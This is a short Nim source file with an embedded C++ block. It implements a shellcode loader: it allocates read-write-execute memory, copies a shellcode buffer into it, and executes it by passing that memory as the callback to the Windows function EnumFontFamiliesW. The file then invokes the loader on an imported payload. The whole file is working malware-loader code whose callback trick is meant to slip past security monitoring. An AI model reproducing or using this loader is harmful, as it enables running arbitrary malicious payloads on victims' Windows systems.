import public

{.emit: """

int EnumFontFamiliesWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    HDC dc = GetDC(NULL);
    EnumFontFamiliesW(dc, NULL, (FONTENUMPROCW)addr, NULL);
    return 0;
}
"""
.}

proc EnumFontFamiliesWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumFontFamiliesWNim(@)",nodecl.}

discard EnumFontFamiliesWNim(code,codelen)